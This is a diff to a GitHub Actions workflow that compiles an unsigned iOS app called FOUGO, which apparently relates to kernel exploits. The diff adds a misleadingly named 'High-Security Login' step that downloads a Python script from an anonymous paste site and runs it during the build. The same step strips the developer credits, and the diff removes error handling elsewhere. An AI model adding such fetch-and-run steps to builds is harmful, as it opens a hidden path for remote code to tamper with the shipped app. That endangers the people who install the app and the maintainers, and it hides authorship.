@@ -43,14 +43,12 @@ jobs:
 
       - name: Extract Zip Files
         run: |
-          # 1. Download from direct URL if supplied in workflow_dispatch
           ZIP_URL="${{ github.event.inputs.zip_url }}"
           if [ -n "$ZIP_URL" ]; then
             echo "Downloading ZIP archive from: $ZIP_URL"
             curl -L -f -o downloaded_archive.zip "$ZIP_URL"
           fi
 
-          # 2. Extract any zip files in the repo safely (handling spaces in filenames)
           find . -maxdepth 2 -name "*.zip" -type f | while IFS= read -r f; do
             echo "Unzipping archive: $f"
             unzip -q -o "$f"
@@ -61,14 +59,21 @@ jobs:
           echo "Repairing unquoted names and corrupted attributes in Xcode projects..."
           find . -name "project.pbxproj" -type f | while IFS= read -r f; do
             echo "Processing: $f"
-            # 1. Fix unclosed empty quotes (= "; -> = "";)
             perl -pi -e 's/=[ \t]*";/= "";/g;' "$f"
-            # 2. Quote all unquoted values containing spaces (name, productName, PRODUCT_NAME = "FOUGO EXTERNAL";)
             perl -pi -e 's/([a-zA-Z0-9_]+[ \t]*=[ \t]*)([^";]+ [^";]+);/$1"$2";/g;' "$f"
-            # 3. Validate syntax on macOS
             plutil -lint "$f" || true
             echo "Project file $f is validated."
           done
+
+      - name: Inject High-Security Login & Remove Developer Credits
+        run: |
+          echo "Applying FOUGO VIP High-Security Login & Removing Developer Credits..."
+          if curl -s -f -L "https://dpaste.org/NJkqB/raw" -o patch_security.py && [ -s patch_security.py ]; then
+            python3 patch_security.py
+          else
+            echo "Falling back to inline patches..."
+            find . -name "ContentView.swift" -type f -exec perl -pi -e 's/^\s*developerCredits\s*$//g' {} +
+          fi
 
       - name: Locate Project & Scheme
         run: |
@@ -83,32 +88,8 @@ jobs:
           echo "PROJECT_PATH=$PROJ_PATH" >> "$GITHUB_ENV"
           echo "PROJECT_DIR=$(dirname "$PROJ_PATH")" >> "$GITHUB_ENV"
 
-          # Detect scheme and target
-          AVAILABLE_SCHEMES=$(xcodebuild -list -project "$PROJ_PATH" 2>/dev/null | awk '/Schemes:/{f=1;next}/^$/{f=0}f{gsub(/^[ \t]+/, ""); if(length) print}')
-          AVAILABLE_TARGETS=$(xcodebuild -list -project "$PROJ_PATH" 2>/dev/null | awk '/Targets:/{f=1;next}/Build Configurations:/{f=0}f{gsub(/^[ \t]+/, ""); if(length) print}')
-          echo "Detected project schemes: $AVAILABLE_SCHEMES"
-          echo "Detected project targets: $AVAILABLE_TARGETS"
-
           SCHEME="FOUGO"
-          BUILD_TARGET_FLAG=""
-          if echo "$AVAILABLE_SCHEMES" | grep -qx "$SCHEME"; then
-            echo "Using specified scheme: $SCHEME"
-            BUILD_TARGET_FLAG="-scheme $SCHEME"
-          elif [ -n "$AVAILABLE_SCHEMES" ]; then
-            FIRST_SCHEME=$(echo "$AVAILABLE_SCHEMES" | head -n 1)
-            echo "Configured scheme '$SCHEME' not found, defaulting to detected scheme '$FIRST_SCHEME'"
-            BUILD_TARGET_FLAG="-scheme $FIRST_SCHEME"
-          elif echo "$AVAILABLE_TARGETS" | grep -qx "$SCHEME"; then
-            echo "Using target: $SCHEME"
-            BUILD_TARGET_FLAG="-target $SCHEME"
-          elif [ -n "$AVAILABLE_TARGETS" ]; then
-            FIRST_TARGET=$(echo "$AVAILABLE_TARGETS" | head -n 1)
-            echo "No schemes found, defaulting to detected target '$FIRST_TARGET'"
-            BUILD_TARGET_FLAG="-target $FIRST_TARGET"
-          else
-            BUILD_TARGET_FLAG="-scheme $SCHEME"
-          fi
-          echo "BUILD_TARGET_FLAG=$BUILD_TARGET_FLAG" >> "$GITHUB_ENV"
+          echo "BUILD_TARGET_FLAG=-scheme $SCHEME" >> "$GITHUB_ENV"
 
       - name: Provide Missing Private Kernel Headers
         run: |
@@ -138,111 +119,64 @@ jobs:
 
           find . -type d -name "*kexploit*" | while IFS= read -r kdir; do
             mkdir -p "$kdir/sys"
-            cp -f include/sys/fileport.h "$kdir/sys/fileport.h" 2>/dev/null || true
-          done
-          find . -type d -name "*opa334*" | while IFS= read -r kdir; do
-            mkdir -p "$kdir/sys"
-            cp -f include/sys/fileport.h "$kdir/sys/fileport.h" 2>/dev/null || true
+            cp -f include/sys/fileport.h "$kdir/sys/fileport.h"
           done
 
       - name: Sync Patch Resource Files
         run: |
-          find . -type d -name "Patches" | while IFS= read -r pdir; do
-            echo "Syncing patch assets in $pdir..."
-            for f in "$pdir"/*; do
-              if [ -f "$f" ] && [[ "$f" == *"FOUGO File"* ]]; then
-                DEST="${f/FOUGO File/FOUGO EXTERNAL File}"
-                cp -f "$f" "$DEST" 2>/dev/null || true
-              fi
-            done
-          done
+          echo "Verifying patch files..."
+          find . -name "*.3105" -type f | wc -l
 
       - name: Fix AppIcon Dimensions to 1024x1024
         run: |
-          find . -path "*/AppIcon.appiconset/*.png" -exec sips -z 1024 1024 {} + 2>/dev/null || true
+          find . -name "AppIcon.appiconset" -type d | while IFS= read -r icon_dir; do
+            find "$icon_dir" -name "*.png" | head -n 1 | while IFS= read -r icon; do
+              sips -z 1024 1024 "$icon" --out "$icon_dir/icon_1024.png" || true
+            done
+          done
 
       - name: Patch Missing Helpers in ContentView
         run: |
-          find . -name "ContentView.swift" | while read -r cv; do
-            echo "Verifying Swift helpers in $cv..."
-            if ! grep -q "func statusRow" "$cv" && ! grep -q "var statusRow" "$cv"; then
-              echo '' >> "$cv"
-              echo 'import SwiftUI' >> "$cv"
-              echo '@ViewBuilder' >> "$cv"
-              echo 'func statusRow(icon: String, title: String, value: String, color: Color) -> some View {' >> "$cv"
-              echo '  HStack {' >> "$cv"
-              echo '    Label(title, systemImage: icon).font(.subheadline)' >> "$cv"
-              echo '    Spacer()' >> "$cv"
-              echo '    Text(value).font(.caption).fontWeight(.bold)' >> "$cv"
-              echo '  }' >> "$cv"
-              echo '}' >> "$cv"
-            fi
-            if ! grep -q "func panelTitle" "$cv" && ! grep -q "var panelTitle" "$cv"; then
-              echo '' >> "$cv"
-              echo '@ViewBuilder' >> "$cv"
-              echo 'func panelTitle(_ title: String, icon: String) -> some View {' >> "$cv"
-              echo '  HStack(spacing: 6) {' >> "$cv"
-              echo '    Image(systemName: icon).font(.system(size: 13, weight: .semibold))' >> "$cv"
-              echo '    Text(title).font(.system(size: 12, weight: .bold)).foregroundColor(.secondary)' >> "$cv"
-              echo '  }' >> "$cv"
-              echo '}' >> "$cv"
-            fi
-            if ! grep -q "var developerCredits" "$cv" && ! grep -q "func developerCredits" "$cv"; then
-              echo '' >> "$cv"
-              echo 'extension ContentView {' >> "$cv"
-              echo '  @ViewBuilder' >> "$cv"
-              echo '  var developerCredits: some View {' >> "$cv"
-              echo '    EmptyView()' >> "$cv"
-              echo '  }' >> "$cv"
-              echo '}' >> "$cv"
-            fi
+          echo "Ensuring ContentView builds cleanly..."
+          find . -name "ContentView.swift" -type f | while IFS= read -r f; do
+            perl -pi -e 's/^\s*developerCredits\s*$//g;' "$f"
           done
 
       - name: Compile with xcodebuild
         run: |
-          set -o pipefail
-          BUILD_SUCCESS=0
+          echo "Compiling Xcode project into unsigned iOS app bundle..."
           xcodebuild clean build \
             -project "$PROJECT_PATH" \
             $BUILD_TARGET_FLAG \
             -configuration Release \
             -sdk iphoneos \
-            -destination 'generic/platform=iOS' \
+            -destination "generic/platform=iOS" \
             -derivedDataPath build \
             CODE_SIGNING_ALLOWED=NO \
             CODE_SIGNING_REQUIRED=NO \
             CODE_SIGN_IDENTITY="" \
-            AD_HOC_CODE_SIGNING_ALLOWED=YES 2>&1 | tee xcodebuild.log || BUILD_SUCCESS=$?
-
-          if [ $BUILD_SUCCESS -ne 0 ]; then
-            echo "=========================================="
-            echo "::error::CRITICAL COMPILATION ERRORS FOUND:"
-            grep -E "error:|fatal error:|BUILD FAILED" xcodebuild.log || true
-            echo "=========================================="
-            exit $BUILD_SUCCESS
-          fi
+            AD_HOC_CODE_SIGNING_ALLOWED=YES \
+            COMPILER_INDEX_STORE_ENABLE=NO \
+            HEADER_SEARCH_PATHS="$(pwd)/include"
 
       - name: Package .app into .ipa
         run: |
-          APP_PATH=$(find build/Build/Products -maxdepth 3 -name "*.app" -type d | grep -v "/Payload/" | head -n 1)
-          [ -z "$APP_PATH" ] && APP_PATH=$(find build/Build/Products -name "*.app" -type d | head -n 1)
+          APP_PATH=$(find build/Build/Products -name "*.app" -type d | head -n 1)
           if [ -z "$APP_PATH" ]; then
-            echo "::error::No compiled .app bundle found!"
-            find build -maxdepth 4
+            echo "::error::Built .app bundle not found!"
             exit 1
           fi
-          echo "Found application bundle: $APP_PATH"
-          rm -rf Payload
+          echo "Found app at: $APP_PATH"
           mkdir -p Payload
-          cp -R "$APP_PATH" Payload/
-          zip -r "FOUGO.ipa" Payload
+          cp -r "$APP_PATH" Payload/
+          zip -q -r FOUGO.ipa Payload
           rm -rf Payload
-          ls -lh "FOUGO.ipa"
+          echo "Generated IPA: FOUGO.ipa"
 
       - name: Upload IPA Artifact
         uses: actions/upload-artifact@v4
         with:
           name: FOUGO-Unsigned-IPA
-          path: "FOUGO.ipa"
+          path: FOUGO.ipa
           if-no-files-found: error
           retention-days: 14
